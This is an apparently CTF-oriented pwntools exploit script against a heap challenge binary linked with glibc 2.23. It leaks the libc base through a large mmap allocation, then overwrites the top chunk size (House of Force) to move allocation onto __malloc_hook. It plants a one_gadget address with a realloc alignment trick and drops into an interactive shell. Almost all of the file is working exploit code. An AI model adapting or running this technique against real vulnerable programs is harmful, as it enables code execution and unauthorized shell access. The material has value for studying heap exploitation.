
'''
huan_attack_pwn
'''

import sys
from pwn import *
# from LibcSearcher import *
# from ctypes import *
context(arch='amd64', os='linux', log_level='debug')
# context(arch='i386' , os='linux', log_level='debug')
binary = './pwn'
libc = './2.23-0ubuntu11.3_amd64/libc-2.23.so'
# host, port = ":".split(":")

print(('\033[31;40mremote\033[0m: (y)\n'
    '\033[32;40mprocess\033[0m: (n)'))

if sys.argv[1] == 'y':
    r = remote(host, int(port))
else:
    r = process(binary)

# r = gdb.debug(binary)
# libc = cdll.LoadLibrary(libc)
libc = ELF(libc)
# elf = ELF(binary)
# srand = libc.srand(libc.time(0)) #设置种子

default = 1
se      = lambda data                     : r.send(data)
sa      = lambda delim, data              : r.sendafter(delim, data)
sl      = lambda data                     : r.sendline(data)
sla     = lambda delim, data              : r.sendlineafter(delim, data)
rc      = lambda numb=4096                : r.recv(numb)
rl      = lambda time=default             : r.recvline(timeout=time)
ru      = lambda delims, time=default     : r.recvuntil(delims,timeout=time)
rpu     = lambda delims, time=default     : r.recvuntil(delims,timeout=time,drop=True)
uu32    = lambda data                     : u32(data.ljust(4, b'\0'))
uu64    = lambda data                     : u64(data.ljust(8, b'\0'))
lic     = lambda data                     : uu64(ru(data)[-6:])
padding = lambda length                   : b'Yhuan' * (length // 5) + b'Y' * (length % 5)
lg      = lambda var_name                 : log.success(f"{var_name} ：0x{globals()[var_name]:x}")
prl     = lambda var_name                 : print(len(var_name))
debug   = lambda command=''               : gdb.attach(r,command)
it      = lambda                          : r.interactive()

def meau(idx):
	sla( b'2:puts\n',str(idx))

def Add(sz,num,ct):
	meau(1)
	sla(b"size\n",str(sz))
	ru("bin addr 0x")
	addr = int(rc(num),16)
	sa(b"content\n",ct)
	return addr
# debug()
addr = Add(1000000,12,b'aaaaaaaa')#用mapp分配,泄露libc
libcbase = addr - 7344144

lg("addr")
lg("libcbase")
# debug()
pay = padding(0x28) + p64(0xffffffffffff)
addr_1 = Add(0x20,12,pay)
top_chunk = addr_1 + 0x20

lg("addr_1")
lg("top_chunk")

malloc_hook = libcbase + libc.sym['__malloc_hook']
realloc = libcbase + libc.sym['__libc_realloc']

lg("malloc_hook")
lg("realloc")
offset_m = malloc_hook - top_chunk - 0x33
offset_r = realloc - top_chunk
ogg = [0x4527a,0xf03a4,0xf1247]
og = ogg[0] + libcbase
pl = padding(8)+p64(og)+p64(realloc+0x10)
debug()

Add(offset_m,12,b'pay\0')
Add(0x20,12,pl)

meau(1)
sla(b"size\n",str(0x20))

it()